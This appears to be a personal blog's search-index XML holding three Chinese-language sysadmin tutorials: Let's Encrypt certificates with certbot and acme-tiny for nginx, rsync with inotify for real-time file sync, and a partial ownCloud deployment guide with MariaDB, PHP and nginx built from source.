<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Let’s Encrypt使用]]></title>
    <url>%2Fhttps-encrypt.html</url>
    <content type="text"><![CDATA[Let’s Encrypt 及 Certbot 简介Let’s Encrypt 是 一个叫 ISRG （ Internet Security Research Group ，互联网安全研究小组）的组织推出的免费安全证书计划。参与这个计划的组织和公司可以说是互联网顶顶重要的先驱，除了前文提到的三个牛气哄哄的发起单位外，后来又有思科（全球网络设备制造商执牛耳者）、 Akamai 加入，甚至连 Linux 基金会也加入了合作，这些大牌组织的加入保证了这个项目的可信度和可持续性。 尽管项目本身以及有该项目签发的证书很可信，但一开始 Let’s Encrypt 的安全证书配置起来比较麻烦，需要手动获取及部署。存在一定的门槛，没有一些技术底子可能比较难搞定。然后有一些网友就自己做了一些脚本来优化和简化部署过程。1. 获取 Certbot 客户端 123wget https://dl.eff.org/certbot-autochmod a+x ./certbot-auto./certbot-auto --help 2. 配置 nginx 、验证域名所有权 在虚拟主机配置文件/usr/local/nginx/conf/vhost/fenghong.tech.conf中添加如下内容，这一步是为了通过 Let’s Encrypt 的验证，验证 fenghong.tech 这个域名是属于我的管理之下。（具体解释可见下一章“一些补充说明”的“ certbot 的两种工作方式”） 12345678location ^~ /.well-known/acme-challenge/ &#123; default_type &quot;text/plain&quot;; root /www;&#125; location = /.well-known/acme-challenge/ &#123; return 404;&#125; 3. 重载 nginx 配置好 Nginx 配置文件，重载使修改生效（如果是其他系统 nginx 重载方法可能不同）1sudo nginx -s reload 4. 生成证书 1./certbot-auto certonly --webroot -w /www -d fenghong.tech 中间会有一些自动运行及安装的软件，不用管，让其自动运行就好，有一步要求输入邮箱地址的提示，照着输入自己的邮箱即可，顺利完成的话，屏幕上会有提示信息。 此处有坑！如果顺利执行请直接跳到第五步，我在自己的服务器上执行多次都提示 1connection :: The server could not connect to the client for DV :: DNS query timed out 发现问题出在 DNS 服务器上，我用的是 DNSpod ，无法通过验证，最后是将域名的 DNS 服务器临时换成 Godaddy 的才解决问题，通过验证，然后再换回原来的 DNSpod 。证书生成成功后，会有 Congratulations 的提示，并告诉我们证书放在 /etc/letsencrypt/live 这个位置12345678910111213141516171819202122IMPORTANT NOTES: - The following errors were reported by the server: Domain: fenghong.tech Type: unauthorized Detail: Invalid response from http://fenghong.tech/.well-known/acme-challenge/kx-juv4XwQFz1TkhL1xGNda5Nm8_fwa8rQoRUfvS01c: &quot;&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n &lt;head&gt;\n &lt;meta http-equiv=\&quot;Content-type\&quot; content=\&quot;text/html; charset=utf-8\&quot;&gt;\n &lt;meta http-equiv=\&quot;Co&quot; Domain: www.fenghong.tech Type: unauthorized Detail: Invalid response from http://www.fenghong.tech/.well-known/acme-challenge/B0jELU0RmyeEt9xA9FKi6NTxj4m5PjJlvx4iCXNR4d8: &quot;&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n &lt;head&gt;\n &lt;meta http-equiv=\&quot;Content-type\&quot; content=\&quot;text/html; charset=utf-8\&quot;&gt;\n &lt;meta http-equiv=\&quot;Co&quot; To fix these errors, please make sure that your domain name was entered correctly and the DNS A/AAAA record(s) for that domain contain(s) the right IP address. 这个问题是因为自己的A记录是指向了github.io，导致配置文件根本读取不到，取消gitub的A记录即可，保持自己的A记录指向自己的IP哦！ 12IMPORTANT NOTES:- Congratulations! Your certificate and chain have been saved at /etc/letsencrypt/live/fenghong.tech/fullchain.pem. Your cert will expire on 2019-02-0. To obtain a new version of the certificate in the future, simply run Let&apos;s Encrypt again. 5. 配置 Nginx（修改 /usr/local/nginx/conf/vhost/fenghong.tech.conf），使用 SSL 证书 123456listen 443 ssl;server_name fenghong.tech www.fenghong.tech;index index.html index.htm index.php;root /www; ssl_certificate /etc/letsencrypt/live/fenghong.tech/fullchain.pem;ssl_certificate_key /etc/letsencrypt/live/fenghong.tech/privkey.pem; 上面那一段是配置了 https 的访问，我们再添加一段 http 的自动访问跳转，将所有通过 http://www.fenghong.tech 的访问请求自动重定向到 https://fenghong.tech 12345server &#123; listen 80; server_name fenghong.tech www.fenghong.tech; return 301 https://$server_name$request_uri;&#125; 6. 重载 nginx，大功告成，此时打开网站就可以显示绿色小锁了 1sudo nginx -s reload ♦后续工作出于安全策略， Let’s Encrypt 签发的证书有效期只有 90 天，所以需要每隔三个月就要更新一次安全证书，虽然有点麻烦，但是为了网络安全，这是值得的也是应该的。好在 Certbot 也提供了很方便的更新方法。 测试一下更新，这一步没有在真的更新，只是在调用 Certbot 进行测试 1./certbot-auto renew --dry-run 如果出现类似的结果，就说明测试成功了（总之有 Congratulations 的字眼） 12345Congratulations, all renewals succeeded. The following certs have been renewed: /etc/letsencrypt/live/wiki.fenghong.tech/fullchain.pem (success) /etc/letsencrypt/live/fenghong.tech/fullchain.pem (success)** DRY RUN: simulating &apos;certbot renew&apos; close to cert expiry** (The test certificates above have not been saved.) 手动更新的方法 1./certbot-auto renew -v 自动更新的方法 1./certbot-auto renew --quiet --no-self-upgrade ♦一些补充说明解释1、certbot-auto 和 certbot certbot-auto 和 certbot 本质上是完全一样的；不同之处在于运行 certbot-auto 会自动安装它自己所需要的一些依赖，并且自动更新客户端工具。因此在你使用 certbot-auto 情况下，只需运行在当前目录执行即可 1./certbot-auto 2、certbot的两种工作方式 certbot （实际上是 certbot-auto ） 有两种方式生成证书： standalone 方式： certbot 会自己运行一个 web server 来进行验证。如果我们自己的服务器上已经有 web server 正在运行 （比如 Nginx 或 Apache ），用 standalone 方式的话需要先关掉它，以免冲突。 webroot 方式： certbot 会利用既有的 web server，在其 web root目录下创建隐藏文件， Let’s Encrypt 服务端会通过域名来访问这些隐藏文件，以确认你的确拥有对应域名的控制权。 本文用的是 webroot 方式，也只推荐 webroot 方式，这也是前文第二步验证域名所有权在 nginx 虚拟主机配置文件中添加 location 段落内容的原因。 试了下这个脚本，在它的基础上改了一些，签发/更新比较方便（其实就是重新签发）。核心是使用diafygi/acme-tiny，相对于certbot复杂以及各种环境检查，安装一堆东西，这个Python写的工具我感觉好用多了，在傻瓜式和使用上选择了一个折中合适的点。 一个快速获取/更新 Let’s encrypt 证书的 shell script 调用 acme_tiny.py 认证、获取、更新证书，不需要额外的依赖。 下载到本地 123wget https://raw.githubusercontent.com/oldthreefeng/scripts/master/lets-encrypt/letsencrypt.confwget https://raw.githubusercontent.com/oldthreefeng/scripts/master/lets-encrypt/letsencrypt.shchmod +x letsencrypt.sh 配置文件 只需要修改 DOMAIN_KEY DOMAIN_DIR DOMAINS 为你自己的信息 123456ACCOUNT_KEY=&quot;letsencrypt-account.key&quot;DOMAIN_KEY=&quot;example.com.key&quot;DOMAIN_DIR=&quot;/var/www/example.com&quot;DOMAINS=&quot;DNS:example.com,DNS:whatever.example.com&quot;#ECC=TRUE#LIGHTTPD=TRUE 执行过程中会自动生成需要的 key 文件。其中 ACCOUNT_KEY 为账户密钥， DOMAIN_KEY 为域名私钥， DOMAIN_DIR 为域名指向的目录，DOMAINS 为要签的域名列表， 需要 ECC 证书时取消 #ECC=TRUE 的注释，需要为 lighttpd 生成 pem 文件时，取消 #LIGHTTPD=TRUE 的注释。 运行 1./letsencrypt.sh letsencrypt.conf 注意 需要已经绑定域名到 /var/www/example.com 目录，即通过 http://example.com http://whatever.example.com 可以访问到 /var/www/example.com 目录，用于域名的验证 将会生成如下几个文件 lets-encrypt-x1-cross-signed.pem example.chained.crt # 即网上搜索教程里常见的 fullchain.pem example.com.key # 即网上搜索教程里常见的 privkey.pem example.crt example.csr 在 nginx 里添加 ssl 相关的配置 ssl_certificate /path/to/cert/example.chained.crt; ssl_certificate_key /path/to/cert/example.com.key; cron 定时任务 每个月自动更新一次证书，可以在脚本最后加入 service nginx reload等重新加载服务。 10 0 1 * * /etc/nginx/certs/letsencrypt.sh /etc/nginx/certs/letsencrypt.conf &gt;&gt; /var/log/lets-encrypt.log 2&gt;&amp;1 &amp;&amp; nginx -s reload 多个域名处理 我有aaa.com和bbb.com，在同一个主机里进行https证书生成，这时，我们生成两个比如aaa.conf和bbb.conf.生成两个文件后，脚本运行两次即可。当然配置文件内容请看上面的信息，按需更改。利用crontab 进行每月更新，具体如上，就不赘述了。 12./letsencrypt.sh aaa.conf./letsencrypt.sh bbb.conf 其它参考 Let’s Encrypt，免费好用的 HTTPS 证书 Let’s Encrypt免费HTTPS SSL证书获取教程 用Let’s Encrypt获取免费证书 免费SSL证书Let’s Encrypt安装使用教程:Apache和Nginx配置SSL How To Secure Nginx with Let’s Encrypt on Ubuntu 14.04 一个快速获取/更新 Let’s encrypt 证书的 shell script | 另外一个 Cipherli.st 提供了各种webserver和一些软件的ssl推荐配置 SSL Server Test 站点https安全分析/检查 实践个人网站迁移HTTPS与HTTP/2 Wiki · Tanky Woo]]></content>
      <categories>
        <category>server</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Python</tag>
        <tag>nginx</tag>
        <tag>certbot</tag>
        <tag>https</tag>
        <tag>acme_tiny</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[rsync和inotify实现文件同步]]></title>
    <url>%2Frsync.html</url>
    <content type="text"><![CDATA[rsync什么是rsyncrsync是一个远程数据同步工具，可通过LAN/WAN快速同步多台主机间的文件。它使用所谓的“Rsync演算法”来使本地和远程两个主机之间的文件达到同步，这个算法只传送两个文件的不同部分，而不是每次都整份传送，因此速度相当快。所以通常可以作为备份工具来使用。 运行Rsync server的机器也叫backup server，一个Rsync server可同时备份多个client的数据；也可以多个Rsync server备份一个client的数据。Rsync可以搭配ssh甚至使用daemon模式。Rsync server会打开一个873的服务通道(port)，等待对方rsync连接。连接时，Rsync server会检查口令是否相符，若通过口令查核，则可以开始进行文件传输。第一次连通完成时，会把整份文件传输一次，下一次就只传送二个文件之间不同的部份。 基本特点： 可以镜像保存整个目录树和文件系统； 可以很容易做到保持原来文件的权限、时间、软硬链接等； 无须特殊权限即可安装； 优化的流程，文件传输效率高； 可以使用rcp、ssh等方式来传输文件，当然也可以通过直接的socket连接； 支持匿名传输。 rsync同步过程：rsync在同步文件的时候， 接收端会从发送端的数据中读取由文件索引号确认的文件. 然后打开本地文件(被称为基础文件), 建立一个临时文件. 接收端会读取非匹配数据和匹配数据, 并按顺序重组他们成为最终文件. 当非匹配数据被读取, 它会被写入到临时文件. 当收到一个块匹配记录, 接收端会寻找这个块在基础文件中的偏移量, 将这个块拷贝到临时文件. 通过这种方式, 临时文件被从头到尾建立起来. 建立临时文件的时候生成了文件的校验. 重建文件结束后, 这个校验和来自发送端的校验比较. 如果校验不符, 临时文件会被删除. 如果失败一次, 文件会再被处理一次. 如果失败第二次, 一个错误会被报告. 临时文件建立后, 所有者, 权限和修改时间会被设置. 然后它会被重命名已替代基础文件. Rsync工作原理1）软件简介 Rsync 是一个远程数据同步工具，可通过 LAN/WAN 快速同步多台主机间的文件。Rsync 本来是用以取代rcp 的一个工具，它当前由 Rsync.samba.org 维护。Rsync 使用所谓的“Rsync 演算法”来使本地和远程两个主机之间的文件达到同步，这个算法只传送两个文件的不同部分，而不是每次都整份传送，因此速度相当快。运行 Rsync server 的机器也叫 backup server，一个 Rsync server 可同时备份多个 client 的数据；也可以多个Rsync server 备份一个 client 的数据。 Rsync 可以搭配 rsh 或 ssh 甚至使用 daemon 模式。Rsync server 会打开一个873的服务通道（port），等待对方 Rsync 连接。连接时，Rsync server 会检查口令是否相符，若通过口令查核，则可以开始进行文件传输。第一次连通完成时，会把整份文件传输一次，下一次就只传送二个文件之间不同的部份。 Rsync 支持大多数的类 Unix 系统，无论是 Linux、Solaris 还是 BSD 上都经过了良好的测试。此外，它在windows 平台下也有相应的版本，比较知名的有 cwRsync 和 Sync2NAS。 Rsync 的基本特点如下： 可以镜像保存整个目录树和文件系统；可以很容易做到保持原来文件的权限、时间、软硬链接等；无须特殊权限即可安装；优化的流程，文件传输效率高；可以使用 rcp、ssh 等方式来传输文件，当然也可以通过直接的 socket 连接；支持匿名传输。 2）核心算法 假定在名为 α 和 β 的两台计算机之间同步相似的文件 A 与 B，其中 α 对文件A拥有访问权，β 对文件 B 拥有访问权。并且假定主机 α 与 β 之间的网络带宽很小。那么 Rsync 算法将通过下面的五个步骤来完成： β 将文件 B 分割成一组不重叠的固定大小为 S 字节的数据块。最后一块可能会比 S 小。β 对每一个分割好的数据块执行两种校验：一种是32位的滚动弱校验，另一种是128位的 MD4 强校验。β 将这些校验结果发给 α。α 通过搜索文件 A 的所有大小为 S 的数据块（偏移量可以任选，不一定非要是 S 的倍数），来寻找与文件B 的某一块有着相同的弱校验码和强校验码的数据块。这项工作可以借助滚动校验的特性很快完成。α 发给 β 一串指令来生成文件 A 在 β 上的备份。这里的每一条指令要么是对文件 B 经拥有某一个数据块而不须重传的证明，要么是一个数据块，这个数据块肯定是没有与文件 B 的任何一个数据块匹配上的。 3） 文件级别的RSync（只传输变化的文件）工作过程：（我的理解） * 机器A构造FileList，FileList包含了需要与机器B sync的所有文件信息对name-&gt;id,（id用来唯一表示文件例如MD5）；* 机器A将FileList发送到机器B；* 机器B上运行的后台程序处理FileList，构建NewFileList，其中根据MD5的比较来删除机器B上已经存在的文件的信息对，只保留机器B上不存在或变化的文件;* 机器A得到NewFileList，对NewFileList中的文件从新传输到机器B； 安装：rsync在CentOS6上默认已经安装，如果没有则可以使用yum install rsync -y，服务端和客户端是同一个安装包。 同步到远程服务器在服务器间rsync传输文件，需要有一个是开着rsync的服务，而这一服务需要两个配置文件，说明当前运行的用户名和用户组，这个用户名和用户组在改变文件权限和相关内容的时候有用，否则有时候会出现提示权限问题。配置文件也说明了模块、模块化管理服务的安全性，每个模块的名称都是自己定义的，可以添加用户名密码验证，也可以验证IP，设置目录是否可写等，不同模块用于同步不同需求的目录。 服务端配置文件/etc/rsyncd.conf： 12345678910111213141516171819202122232425262728293031#2014-12-11 by Seanuid = rootgid = rootuse chroot = nopid file = /var/run/rsyncd.pidlog file = /var/log/rsyncd.logport = 873read only = no[qianxiang]path = /data/qianxiang/web/ignore errorsauth users = rootsecrets file = /etc/rsyncd.secretshosts allow = 192.168.1.1hosts deny = *[file]path = /data/cun_web/ignore errorsauth users = rootsecrets file = /etc/rsyncd.secretshosts allow = 192.168.1.1hosts deny = *[nginx]path = /etc/nginx/ignore errorsauth users = rootsecrets file = /etc/rsyncd.secretshosts allow = 192.168.1.1hosts deny = * 这里配置socket方式传输文件，端口873，[module_test]开始定义一个模块，指定要同步的目录（接收）path，授权用户，密码文件，允许哪台服务器IP同步（发送）等。 经测试，上述配置文件每行后面不能使用#来来注释 /etc/rsyncd.secrets： 1root:passw0rd 一行一个用户，用户名:密码。请注意这里的用户名和密码与操作系统的用户名密码无关，可以随意指定，与/etc/rsyncd.conf中的auth users对应。 修改权限：chmod 600 /etc/rsyncd.d/rsync_server.pwd。 服务器启动rsync后台服务修改/etc/xinetd.d/rsync文件，disable 改为 no 1234567891011121314# default: off# description: The rsync server is a good addition to an ftp server, as it \# allows crc checksumming etc.service rsync&#123; disable = no flags = IPv6 socket_type = stream wait = no user = root server = /usr/bin/rsync server_args = --daemon log_on_failure += USERID&#125; 执行service xinetd restart会一起重启rsync后台进程，默认使用配置文件/etc/rsyncd.conf。也可以使用/usr/bin/rsync --daemon --config=/etc/rsyncd.conf，重启建议pkill rsync &amp;&amp; sleep 1 &amp;&amp; /usr/bin/rsync --daemon --config=/etc/rsyncd.conf 为了以防rsync写入过多的无用日志到/var/log/message（容易塞满从而错过重要的信息），建议注释掉/etc/xinetd.conf的success： 1# log_on_success = PID HOST DURATION EXIT 如果使用了防火墙，要添加允许IP到873端口的规则。 123# iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 873 -j ACCEPT# iptables -L 查看一下防火墙是不是打开了 873端口# netstat -anp|grep 873 建议关闭selinux，可能会由于强访问控制导致同步报错 客户端测试同步单向同步时，客户端只需要一个包含密码的文件。/etc/rsync_client.pwd： 1passw0rd chmod 600 /etc/rsync_client.pwd 命令：将本地/root/目录同步到远程192.168.1.1的/tmp/rsync_bak2目录（module_test指定）： 1/usr/bin/rsync -auvrtzopgP --progress --password-file=/etc/rsync_client.pwd /root/ sean@192.168.1.1::file 当然你也可以将远程的/tmp/rsync_bak2目录同步到本地目录/root/tmp： 1/usr/bin/rsync -auvrtzopgP --progress --password-file=/etc/rsync_client.pwd sean@192.168.1.1::filet /root/ 从上面两个命令可以看到，其实这里的服务器与客户端的概念是很模糊的，rsync daemon都运行在远程172.29.88.223上，第一条命令是本地主动推送目录到远程，远程服务器是用来备份的；第二条命令是本地主动向远程索取文件，本地服务器用来备份，也可以认为是本地服务器恢复的一个过程。 inotify-tools什么是inotifyinotify是一种强大的、细粒度的、异步的文件系统事件监控机制，Linux内核从2.6.13开始引入，允许监控程序打开一个独立文件描述符，并针对事件集监控一个或者多个文件，例如打开、关闭、移动/重命名、删除、创建或者改变属性。 CentOS6自然已经支持：使用ll /proc/sys/fs/inotify命令，是否有以下三条信息输出，如果没有表示不支持。 1234total 0-rw-r--r-- 1 root root 0 Dec 11 15:23 max_queued_events-rw-r--r-- 1 root root 0 Dec 11 15:23 max_user_instances-rw-r--r-- 1 root root 0 Dec 11 15:23 max_user_watches /proc/sys/fs/inotify/max_queued_evnets表示调用inotify_init时分配给inotify instance中可排队的event的数目的最大值，超出这个值的事件被丢弃，但会触发IN_Q_OVERFLOW事件。 /proc/sys/fs/inotify/max_user_instances表示每一个real user ID可创建的inotify instatnces的数量上限。 /proc/sys/fs/inotify/max_user_watches表示每个inotify instatnces可监控的最大目录数量。如果监控的文件数目巨大，需要根据情况，适当增加此值的大小。 安装inotify-tools： inotify-tools是为linux下inotify文件监控工具提供的一套C的开发接口库函数，同时还提供了一系列的命令行工具，这些工具可以用来监控文件系统的事件。 inotify-tools是用c编写的，除了要求内核支持inotify外，不依赖于其他。inotify-tools提供两种工具，一是inotifywait，它是用来监控文件或目录的变化，二是inotifywatch，它是用来统计文件系统访问的次数。 下载inotify-tools-3.14-1.el6.x86_64.rpm，通过rpm包安装： 1$ rpm -ivh inotify-tools-3.14-1.el6.x86_64.rpm inotifywait使用示例监控/root/tmp目录文件的变化： 12/usr/bin/inotifywait -mrq --timefmt &apos;%Y/%m/%d-%H:%M:%S&apos; --format &apos;%T %w %f&apos; \ -e modify,delete,create,move,attrib /root/tmp/ 上面的命令表示，持续监听/root/tmp目录及其子目录的文件变化，监听事件包括文件被修改、删除、创建、移动、属性更改，显示到屏幕。执行完上面的命令后，在/root/tmp下创建或修改文件都会有信息输出： 创建排除在外不同步的文件列表排除不需要同步的文件或目录有两种做法，第一种是inotify监控整个目录，在rsync中加入排除选项，简单；第二种是inotify排除部分不监控的目录，同时rsync中也要加入排除选项，可以减少不必要的网络带宽和CPU消耗。我们选择第二种。 inotifywait排除这个操作在客户端进行，假设/tmp/src/mail/2014/以及/tmp/src/mail/2015/cache/目录下的所有文件不用同步，所以不需要监控，/tmp/src/下的其他文件和目录都同步。（其实对于打开的临时文件，可以不监听modify时间而改成监听close_write） inotifywait排除监控目录有--exclude &lt;pattern&gt;和--fromfile &lt;file&gt;两种格式，并且可以同时使用，但主要前者可以用正则，而后者只能是具体的目录或文件。 123# vi /etc/inotify_exclude.lst：/tmp/src/pdf@/tmp/src/2014 使用fromfile格式只能用绝对路径，不能使用诸如*正则表达式去匹配，@表示排除。 如果要排除的格式比较复杂，必须使用正则，那只能在inotifywait中加入选项，如--exclude &#39;(.*/*\.log|.*/*\.swp)$|^/tmp/src/mail/(2014|201.*/cache.*)&#39;，表示排除/tmp/src/mail/以下的2014目录，和所有201*目录下的带cache的文件或目录，以及/tmp/src目录下所有的以.log或.swp结尾的文件。 rsync排除使用inotifywait排除监控目录的情况下，必须同时使用rsync排除对应的目录，否则只要有触发同步操作，必然会导致不该同步的目录也会同步。与inotifywait类似，rsync的同步也有--exclude和--exclude-from两种写法。 个人还是习惯将要排除同步的目录卸载单独的文件列表里，便于管理。使用--include-from=FILE时，排除文件列表用绝对路径，但FILE里面的内容请用相对路径，如：/etc/rsyncd.d/rsync_exclude.lst： 123456789mail??*src/*.html*src/js/src/ext3/src/2014/20140[1-9]/src/201*/201*/201*/.??*membermail/membermail??*membermail/201*/201*/201*/.??* 客户端同步到远程的脚本rsync.sh下面是一个完整的同步脚本，请根据需要进行裁剪，rsync.sh： 12345678910111213141516171819202122232425262728293031#variablescurrent_date=$(date +%Y%m%d_%H%M%S)source_path=/tmp/src/log_file=/var/log/rsync_client.log#rsyncrsync_server=192.168.1.1rsync_user=seanrsync_pwd=/etc/rsync_client.pwdrsync_module=fileINOTIFY_EXCLUDE=&apos;(.*/*\.log|.*/*\.swp)$|^/tmp/src/mail/(2014|20.*/.*che.*)&apos;RSYNC_EXCLUDE=&apos;/etc/rsyncd.d/rsync_exclude.lst&apos;#rsync client pwd checkif [ ! -e $&#123;rsync_pwd&#125; ];then echo -e &quot;rsync client passwod file $&#123;rsync_pwd&#125; does not exist!&quot; exit 0fi#inotify_functioninotify_fun()&#123; /usr/bin/inotifywait -mrq --timefmt &apos;%Y/%m/%d-%H:%M:%S&apos; --format &apos;%T %w %f&apos; \ --exclude $&#123;INOTIFY_EXCLUDE&#125; -e modify,delete,create,move,attrib $&#123;source_path&#125; \ | while read file do /usr/bin/rsync -auvrtzopgP --exclude-from=$&#123;RSYNC_EXCLUDE&#125; --progress --bwlimit=1000 --password-file=$&#123;rsync_pwd&#125; $&#123;source_path&#125; $&#123;rsync_user&#125;@$&#123;rsync_server&#125;::$&#123;rsync_module&#125; done&#125;#inotify loginotify_fun &gt;&gt; $&#123;log_file&#125; 2&gt;&amp;1 &amp; --bwlimit=1000用于限制传输速率最大1000kb，因为在实际应用中发现如果不做速率限制，会导致巨大的CPU消耗。 在客户端运行脚本# ./rsync.sh即可实时同步目录.]]></content>
      <categories>
        <category>server</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>rsync</tag>
        <tag>inotify</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[owncloud私有云搭建]]></title>
    <url>%2Fowncloud_deploy.html</url>
    <content type="text"><![CDATA[owncloud的功能 存储：图片，文档，视频，通讯录以及其他等等 客户端支持：Android，IOS,MaxOS,Windows,Web,Linux 分享：可以直接共享直接链接给授权过的同事 在线看视频，文档，音乐。 可以自行修改功能（作为开发者） 系统安装环境123456789101112CPU model : Intel(R) Xeon(R) Platinum 8163 CPU @ 2.50GHzNumber of cores : 2CPU frequency : 2500.028 MHzTotal amount of ram : 16042 MBTotal amount of swap : 4096 MBSystem uptime : 0days, 0:7:13Load average : 0.00, 0.08, 0.06OS : CentOS 7.5.1804Arch : x86_64 (64 Bit)Kernel : 3.10.0-862.14.4.el7.x86_64Hostname : **********IPv4 address : ********** 安装预览 12345678910111213nginx: nginx-1.15.5nginx Location: /usr/local/nginx /etc/nginx/MariaDB: mariadb-10.2.18MariaDB Location: /usr/local/mariadbMariaDB Data Location: /data/mysqlMariaDB Root Password: *************PHP: php-7.2.11PHP Location: /usr/local/phpPHP Additional Modules:redis.iointl.so mysql二进制安装123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657$ wget http://mirrors.aliyun.com/mariadb//mariadb-10.2.18/bintar-linux-glibc_214-x86_64/mariadb-10.2.18-linux-glibc_214-x86_64.tar.gz$ tar xf mariadb-10.2.18-linux-glibc_214-x86_64.tar.gz -C /usrlocal/$ mv /usr/local/mariadb-10.2.15-linux-x86_64 /usr/local/mariadb$ chown -R mysql:mysql /usr/local/mariadb /data/mysql$ /usr/local/mariadb/scripts/mysql_install_db --basedir=/usr/local/mariadb&#125; --datadir=/data/mysql --user=mysql$ vim /etc/my.conf[mysql]# CLIENT #port = 3306socket = /tmp/mysql.sock[mysqld]# GENERAL #port = 3306user = mysqldefault-storage-engine = InnoDBsocket = /tmp/mysql.sockpid-file = /data/mysql/mysql.pidskip-name-resolveskip-external-locking# INNODB #innodb-log-files-in-group = 2innodb-log-file-size = 256Minnodb-flush-log-at-trx-commit = 2innodb-file-per-table = 1innodb-buffer-pool-size = 2G# CACHES AND LIMITS #tmp-table-size = 32Mmax-heap-table-size = 32Mmax-connections = 4000thread-cache-size = 50open-files-limit = 4096table-open-cache = 1600# SAFETY #max-allowed-packet = 16Mmax-connect-errors = 1000000# DATA STORAGE #datadir = /data/mysql# LOGGING #log-error = /data/mysql/mysql-error.loglog-bin = /data/mysql/mysql-binmax_binlog_size = 1073741824binlog-format = row文件软连接及启动脚本$ ln -s /usr/local/mariadb/bin/mysql /usr/bin/mysql$ ln -s /usr/local/mariadb/bin/mysqldump /usr/bin/mysqldump$ ln -s /usr/local/mariadb/bin/mysqladmin /usr/bin/mysqladmin$ cp -f /usr/local/mariadb/support-files/mysql.server /etc/init.d/mysqld$ sed -i &quot;s:^basedir=.*:basedir=/usr/local/mariadb:g&quot; /etc/init.d/mysqld$ sed -i &quot;s:^datadir=.*:datadir=/data/mysql:g&quot; /etc/init.d/mysqld 创建owncloud用户 123456$ /etc/init.d/mysqld start$ mysql -u root -pMariaDB [(none)] &gt; create database owncloud;MariaDB [(none)] &gt; GRANT ALL ON owncloud.* TO ocuser@localhost IDENTIFIED BY &apos;owncloud&apos;;MariaDB [(none)] &gt; flush privileges;MariaDB [(none)] &gt; exit PHP编译安装 编译安装libconv 1234567$ wget http://ftp.gnu.org/pub/gnu/libiconv/libiconv-1.15.tar.gz$ tar -zxvf libiconv-1.15.tar.gz$ cd libiconv-1.15$ ./configure --prefix=/usr/local/libiconv$ make$ make install$ libtool --finish /usr/local/libiconv/lib 编译安装php7.2.11 12345678910$ yum -y install wget vim pcre pcre-devel openssl openssl-devel libicu-devel gcc gcc-c++ autoconf libjpeg libjpeg-devel libpng libpng-devel freetype freetype-devel libxml2 libxml2-devel zlib zlib-devel glibc glibc-devel glib2 glib2-devel ncurses ncurses-devel curl curl-devel krb5-devel libidn libidn-devel openldap openldap-devel nss_ldap jemalloc-devel cmake boost-devel bison automake libevent libevent-devel gd gd-devel libtool* libmcrypt libmcrypt-devel mcrypt mhash libxslt libxslt-devel readline readline-devel gmp gmp-devel libcurl libcurl-devel openjpeg-devel$ wget http://101.96.10.64/cn2.php.net/distributions/php-7.2.11.tar.gz$ tar xf php-7.2.11.tar.gz &amp;&amp; cd php-7.2.11$ ./configure --prefix=/usr/local/php --with-config-file-path=/etc --enable-fpm --with-fpm-user=nginx --with-fpm-group=nginx --enable-inline-optimization --disable-debug --disable-rpath --enable-shared --enable-soap --with-libxml-dir --with-xmlrpc --with-openssl --with-mhash --with-pcre-regex --with-sqlite3 --with-zlib --enable-bcmath --with-iconv=/usr/local/libiconv --with-bz2 --enable-calendar --with-curl --with-cdb --enable-dom --enable-exif --enable-fileinfo --enable-filter --with-pcre-dir --enable-ftp --with-gd --with-openssl-dir --with-jpeg-dir --with-png-dir --with-zlib-dir --with-freetype-dir --enable-gd-jis-conv --with-gettext --with-gmp --with-mhash --enable-json --enable-mbstring --enable-mbregex --enable-mbregex-backtrack --with-libmbfl --with-onig --enable-pdo --with-mysqli=mysqlnd --with-pdo-mysql=mysqlnd --with-zlib-dir --with-pdo-sqlite --with-readline --enable-session --enable-shmop --enable-simplexml --enable-sockets --enable-sysvmsg --enable-sysvsem --enable-sysvshm --enable-wddx --with-libxml-dir --with-xsl --enable-zip --enable-mysqlnd-compression-support --with-pear --enable-opcache$ make -j 2 &amp;&amp; make install #2核编译。$ cp /usr/local/php/etc/php-fpm.conf.default /usr/local/php/etc/php-fpm.conf$ cp /usr/local/php/etc/php-fpm.d/www.conf.default /usr/local/php/etc/php-fpm.d/www.conf$ cp php.ini-production /usr/local/php/etc/php.ini$ cp sapi/fpm/init.d.php-fpm /etc/init.d/php-fpm$ /etc/init.d/php-fpm start 编译安装redis.io，intl.io 1234567891011121314151617181920212223242526272829#redis.io$ wget http://pecl.php.net/get/redis-4.0.2.tgz$ tar xf redis-4.0.2.tgz $ cd redis-4.0.2$ find / -name php-config$ ./configure --with-php-config=/usr/local/php/bin/php-config$ make &amp;&amp; make install$ vim /usr/local/php/etc/php.iniextentions=redis.ioextension = &quot;redis.so&quot;#icu编译安装$ mkdir /usr/local/icu$ wget http://download.icu-project.org/files/icu4c/52.1/icu4c-52_1-src.tgz$ tar xf icu4c-52_1-src.tgz$ cd icu$ ls$ cd source/$ ./configure --prefix=/usr/local/icu$ make -j 2 &amp;&amp; make install#intl安装$ cd /data/downloads/php-7.2.11/ext/intl$ phpize $ ./configure --enable-intl --with-icu-dir=/usr/local/icu/ --with-php-config=/usr/local/php/bin/php-config$ make -j 2 &amp;&amp; make install$ cd /usr/local/php/lib/php/extensions/no-debug-non-zts-20170718/$ vim /usr/local/php/etc/php.iniextension = &quot;intl.so&quot; nginx 编译安装及配置编译安装12345$ tar -zxvf nginx-1.15.5.tar.gz $ cd nginx-1.15.5$ ./configure --prefix=/usr/local/nginx --conf-path=/etc/nginx/nginx.conf --user=nginx --group=nginx$ useradd -s /sbin/nologin -g nginx -r nginx$ make &amp;&amp; make install 主配置配置文件编写12345678910111213141516171819202122232425262728293031323334353637383940414243444546$ vim /etc/nginx.conf#user nobody;worker_processes 8;error_log /var/log/nginx/error.log;#error_log logs/error.log notice;#error_log logs/error.log info;#pid logs/nginx.pid;pid /var/run/nginx.pid;events &#123; worker_connections 1024;&#125;http &#123; include mime.types; server_tokens off; default_type application/octet-stream; fastcgi_connect_timeout 300; fastcgi_send_timeout 300; fastcgi_read_timeout 300; client_max_body_size 4m; log_format main &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos; &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos; &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;; access_log logs/access.log main; sendfile on; 